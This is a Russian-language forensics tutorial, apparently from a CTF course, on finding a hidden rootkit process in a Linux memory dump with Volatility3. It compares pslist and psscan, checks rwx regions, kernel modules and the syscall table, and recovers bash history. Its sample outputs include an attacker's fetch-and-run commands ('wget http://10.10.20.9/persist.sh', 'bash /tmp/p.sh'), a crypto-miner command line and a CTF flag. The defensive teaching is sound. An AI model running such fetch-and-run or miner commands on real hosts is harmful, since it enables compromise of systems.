## Вопрос, с которого всё начинается

У тебя есть дамп памяти Linux-сервера. Нужно найти малварь, которая, возможно, **скрывает
свой процесс**. С чего начать и как убедиться, что ты видишь все процессы, а не только те,
что «согласился» показать руткит?

Разберём сквозной пример: проанализируем дамп и найдём скрытый процесс.

## Почему анализ Linux-памяти сложнее

Память Windows анализировать «привычнее»: есть структуры `EPROCESS`, а Volatility знает
их расположение. В Linux всё зависит от **конкретной версии ядра** и его конфигурации:
структуры `task_struct`, смещения полей и таблицы символов отличаются от сборки к сборке.

Поэтому первый шаг анализа Linux-дампа — определить **точное ядро** и найти подходящие
**символы** (ISF — Intermediate Symbol Format). Без символов Volatility не сможет разобрать
структуры.

## Шаг 1: определяем ядро

Volatility3 умеет «баннерить» дамп — искать в нём строку версии ядра:

```
$ vol -f mem.lime banners.Banners
Linux version 5.15.0-91-generic (buildd@lcy02) ...
```

Из вывода берём версию `5.15.0-91-generic`. Дальше ищем соответствующий ISF-файл (обычно
`ubuntu.zip` из репозитория Volatility). Если символов нет, анализ ограничится тем, что
можно найти «плоским» поиском.

## Шаг 2: список процессов

Основной плагин — `linux.pslist` (по связному списку задач):

```
$ vol -f mem.lime linux.pslist
PID   PPID  COMM      COMMAND
1     0     systemd   /sbin/init
812   1     nginx     nginx: worker process
1337  1     kworkerd  /tmp/.x/kworkerd --pool pool.example:3333
```

Процесс `1337` с родителем `1` (init) и запущенный из скрытого каталога — подозрителен.
Но это список «по связному списку», который руткит может подделать.

## Шаг 3: ищем скрытые процессы

Ключевой приём — сравнить **разные** способы перечисления процессов:

- `linux.pslist` — обход связного списка задач.
- `linux.pstree` — дерево процессов.
- `linux.psscan` — **сканирование памяти** в поиск структур `task_struct`, не полагаясь на
  список.

Если `psscan` находит процесс, которого нет в `pslist`, это признак **сокрытия**:

```
$ vol -f mem.lime linux.psscan | grep -i hidden
1338  0  hidden   /tmp/.x/hidden --daemon
```

Процесс `hidden` есть в результате сканирования, но отсутствует в списке задач — значит,
его «вырезали» из связного списка (техника **DKOM** — Direct Kernel Object Manipulation).

## Шаг 4: карты памяти и модули

Смотрим, что замаплено в процесс:

```
$ vol -f mem.lime linux.proc.Maps --pid 1338
Start      End        Flags  Path
0x7f8a...  0x7f8a...  r-x    /tmp/.x/hidden
0x7f8a...  0x7f8a...  rwx    [anonymous]
```

Регион `rwx` (читаемый, записываемый и **исполняемый**) без файла на диске — типичный
признак **внедрённого кода**. Легитимные библиотеки обычно `r-x` (исполняемые, но не
записываемые). Так выделяют инъекции.

Проверяем модули ядра:

```
$ vol -f mem.lime linux.lsmod
Address            Name            Size
0xffffffffc0a00000 hidden_rootkit  16384
```

Модуль с подозрительным именем, которого нет в `/sys/module`, — кандидат на руткит.

## Шаг 5: поиск строк и следов

Плоский поиск по дампу часто даёт быстрый результат. Volatility-плагин `strings`/`yarascan`
или обычный `strings` по файлу:

```
$ strings mem.lime | grep -iE 'nto\{|passwd|10\.10\.20'
nto{l1nux_m3m0ry_h1dd3n_pr0c}
```

Так в CTF обычно и находят флаг — он лежит в памяти как часть кода или данных малвари.

## Символы: где взять и что делать без них

Ключевая сложность анализа Linux-памяти — **символы**. Volatility3 использует ISF-файлы,
содержащие описания структур ядра для конкретной версии. Их берут из официального
репозитория (например, `ubuntu.zip`, `debian.zip`) или генерируют сами с помощью
`dwarf2json` из отладочных символов ядра (`vmlinux` с DWARF).

Если символов нет, возможны два пути. Первый — **плоский поиск**: `strings`, `yarascan`,
поиск по сигнатурам. Он не разбирает структуры, но часто сразу даёт флаг, пароли, адреса и
командные строки. Второй — подобрать **близкую версию** символов: иногда структуры соседних
версий совместимы, но результат нужно проверять с осторожностью.

Практический вывод: перед глубоким анализом всегда проверяй наличие ISF. Если их нет —
не трать время на структурные плагины, начни с плоского поиска.

## Плагины, которые стоит знать

Помимо `pslist`, `psscan` и `lsmod`, полезны:

- **`linux.bash`** — восстанавливает историю bash прямо из памяти. Часто даёт команды,
  которых уже нет в `.bash_history`.
- **`linux.sockstat`** — сетевые сокеты и связанные процессы: видно, кто держит соединение.
- **`linux.proc.Maps`** — карты памяти процессов (регионы `rwx`).
- **`linux.envars`** — переменные окружения процессов (ищите `LD_PRELOAD`).
- **`linux.check_syscall`** — сверка таблицы системных вызовов с эталоном: выявляет
  перехваты (hooks).
- **`linux.malfind`** — эвристика поиска внедрённого кода (исполняемые анонимные регионы).

`linux.check_syscall` особенно ценен: руткиты часто подменяют записи в таблице системных
вызовов, чтобы скрывать файлы и процессы. Расхождение с эталоном — прямая улика.

## Практический сценарий: находим руткит

Разберём полный пример. Сначала баннер и символы, затем `pslist`/`psscan` для сравнения.
Находим процесс, которого нет в списке. Смотрим его карты памяти — есть регион `rwx` без
файла. Проверяем `lsmod` — видим модуль `hidden_rootkit`. Сверяем `check_syscall` — таблица
системных вызовов изменена. Наконец, `strings` по дампу находит флаг и адрес C2.

Складывая всё: руткит загружен модулем ядра, перехватывает системные вызовы, скрывает
процесс и держит соединение. Восстановленная картина — **полный ответ** на вопрос «что
происходило на хосте». И всё это — из одного дампа памяти, без доступа к живому серверу.

## Частые ошибки

- **Анализировать без символов.** Структурные плагины выдадут ошибки или мусор.
- **Доверять только `pslist`.** Скрытые процессы видны лишь в `psscan`.
- **Игнорировать `linux.bash`.** История из памяти может содержать команды, которых нет на
  диске.
- **Не сверять таблицу системных вызовов.** Именно там живёт классический руткит.

## Что это даёт в отчёте

По памяти Linux в отчёте фиксируют: список процессов (включая скрытые), сетевые соединения,
загруженные модули, признаки перехвата системных вызовов, восстановленную историю команд и
найденные строки (пароли, адреса, флаги). Это самый «живой» источник улик на сервере, и он
невосстановим после выключения.

## Работа с `linux.bash` и восстановление команд

Плагин `linux.bash` — один из самых полезных на практике, потому что восстанавливает
историю команд **из памяти**, даже если файл `.bash_history` очищен или не был записан.
Механизм прост: bash держит историю в структуре в памяти процесса, и пока процесс жив (или
пока его память не перезаписана), команды можно извлечь.

```
$ vol -f mem.lime linux.bash
PID   Command
1401  wget http://10.10.20.9/persist.sh
1401  bash /tmp/p.sh
1401  crontab -l
```

Здесь видно, что после загрузки скрипта проверяли cron — то есть искали/устанавливали
закрепление. Сопоставляя эти команды с временными метками процессов, можно построить
таймлайн ручных действий даже без дисковых артефактов. Это прямая иллюстрация того, почему
память снимают первой: после выключения эта история исчезнет навсегда.

## Сопоставление памяти и диска

Мощный приём — сравнить то, что видно в памяти, с тем, что есть на диске. Если процесс
исполняется из файла, которого нет на диске (или файл помечен как удалённый), это признак
малвари, удалившей себя. Если модуль ядра есть в памяти, но отсутствует в `/sys/module`,
это скрытый руткит. Если сетевой сокет держит процесс, которого нет в списке, — сокрытие.

Такие расхождения — **лучший источник уверенных выводов**. Память фиксирует реальность на
момент снятия, а диск может быть уже «подчищен». Поэтому анализ памяти и диска не
дублируют, а дополняют друг друга: память показывает «как было», диск — «что осталось».

## Частые ошибки (продолжение)

- **Ожидать те же плагины, что на Windows.** Имена и поведение отличаются; читайте
  документацию Volatility3 для Linux.
- **Игнорировать версию ядра.** Даже близкие версии могут дать неверные смещения.
- **Забывать про `linux.bash`.** Это самый быстрый путь к ручным командам.
- **Не сопоставлять с диском.** Расхождение память/диск — самая сильная улика.

## Что это даёт в отчёте

Совместный анализ памяти и диска даёт наиболее полную картину: список процессов и их
командные строки, восстановленную историю shell, сетевые соединения, загруженные модули и
признаки перехвата. В отчёте это оформляют как «состояние хоста на момент снятия памяти» —
отдельный раздел, который часто и содержит ответ на главный вопрос расследования.

## Итог

Анализ памяти Linux — это сравнение источников: `pslist` против `psscan`, модули в памяти
против `/sys/module`, регионы `rwx` против файлов на диске. Каждое расхождение — улика.
Начни с баннера и символов, затем пройди по процессам и модулям, а `strings` и `linux.bash`
дадут быстрый результат даже без глубокого разбора структур.

## Что мы теперь знаем

- Анализ Linux-памяти зависит от **версии ядра** — сначала нужен баннер и **символы (ISF)**.
- `linux.pslist` — список процессов по связному списку; `linux.psscan` — по сканированию
  памяти.
- Процесс, найденный `psscan`, но отсутствующий в `pslist`, указывает на **сокрытие
  (DKOM)**.
- Регион `rwx` без файла на диске — признак **внедрённого кода**.
- `linux.lsmod` показывает модули ядра; подозрительный модуль — кандидат на руткит.
- Плоский поиск строк (`strings`, `yarascan`) часто сразу даёт флаг.

## Куда дальше

Мы разобрали анализ памяти Linux. Дальше займёмся **swap и pagefile**: что система
выгружает туда и как оттуда достать секреты. А пока главное запомни: **в Linux-памяти
скрытые процессы ищут сравнением `pslist` и `psscan`, а внедрённый код — по регионам
`rwx`**.
